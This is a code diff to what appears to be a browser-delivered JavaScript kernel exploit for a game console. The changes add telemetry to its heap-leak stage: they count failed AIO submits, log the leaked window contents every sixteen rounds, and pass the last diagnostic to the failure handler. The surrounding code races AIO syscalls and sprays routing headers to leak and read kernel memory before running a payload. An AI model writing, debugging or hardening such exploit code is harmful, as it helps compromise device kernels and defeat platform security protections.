@@ -1509,11 +1509,17 @@ function makeRpc(worker) {
                 }
 
                 let reqs2Base = -1;
+                let leakRounds = 0, leakFailSubmits = 0, leakLastRv = 0,
+                    leakLastWindow = "";
                 for (let round = 0; round < EVF_ATTEMPTS && reqs2Base < 0; ++round) {
-                    for (let i = 0; i < HANDLES_NUM; ++i)
-                        sc(SYS.aio_submit_cmd, AIO_CMD_WRITE | AIO_CMD_MULTI,
+                    let submitRv = 0;
+                    for (let i = 0; i < HANDLES_NUM; ++i) {
+                        submitRv = sc(SYS.aio_submit_cmd, AIO_CMD_WRITE | AIO_CMD_MULTI,
                             reqs1.addr, LEAK_NUM_REQS, AIO_PRIORITY_HIGH,
-                            leakIds.addr.add32(i * LEAK_NUM_REQS * 4));
+                            leakIds.addr.add32(i * LEAK_NUM_REQS * 4)).i32;
+                        if (submitRv !== 0) leakFailSubmits++;
+                    }
+                    leakLastRv = submitRv;
 
                     getRthdr(dirty, 0x800);
                     for (let j = 1; j < 0x10; ++j)
@@ -1524,16 +1530,35 @@ function makeRpc(worker) {
                             + " after " + round + " round(s)");
                         break;
                     }
+                    // Telemetry for the intermittent stage-2 starvation seen on
+                    // hardware (console log 2026-10-29): report the submit
+                    // return codes and what the window actually held, so the
+                    // next failure names its reason in console-diag.log.
+                    if (round % 16 === 15 || round === EVF_ATTEMPTS - 1) {
+                        const cmds = [];
+                        for (let j = 1; j < 0x10; ++j)
+                            cmds.push(hx(leakRthdr.dv.getUint32(
+                                j * AIO_ENTRY_SIZE + AR2_CMD, true)));
+                        leakLastWindow = cmds.join(",");
+                        mark("REQS2-SCAN", "round=" + round
+                            + " submit_rv=" + hx(leakLastRv >>> 0)
+                            + " fails=" + leakFailSubmits
+                            + " window_cmds=" + leakLastWindow);
+                    }
                     for (let o = 0; o < leakIds.len / 4; o += AIO_MAX_NUM) {
                         const step = Math.min(AIO_MAX_NUM, leakIds.len / 4 - o);
                         sc(SYS.aio_multi_cancel, leakIds.addr.add32(o * 4), step, outs.addr);
                         sc(SYS.aio_multi_poll, leakIds.addr.add32(o * 4), step, outs.addr);
                         sc(SYS.aio_multi_delete, leakIds.addr.add32(o * 4), step, outs.addr);
                     }
+                    leakRounds++;
                 }
                 if (!check("full-aio_entry-leaked", reqs2Base >= 0,
                         reqs2Base >= 0 ? "at +0x" + reqs2Base.toString(16)
-                                       : "no entry passed verification")) return false;
+                            : leakRounds + " rounds, " + leakFailSubmits
+                              + " failing submit(s), last submit_rv="
+                              + hx(leakLastRv >>> 0)
+                              + ", last window " + leakLastWindow)) return false;
 
                 const reqs1Addr = lk8(reqs2Base + AR2_REQS1);
                 const aioInfoAddr = lk8(reqs2Base + AR2_INFO);
@@ -3873,7 +3898,10 @@ function makeRpc(worker) {
                 stateEl.className = "bad";
             } catch (e) { }
             if (!payloadRunning) {
-                hostFail();
+                // Name the actual last diagnostic instead of the hidden
+                // "REBOOT THE CONSOLE" state text (seen on the console,
+                // 2026-10-29: "... Restart Your Console ... REBOOT THE CONSOLE").
+                hostFail(lines.length ? lines[lines.length - 1] : "");
             }
         } else if (repaired && cleanupDone) {
             // Everything doubly-owned was repaired and proven; a relaunch is safe.
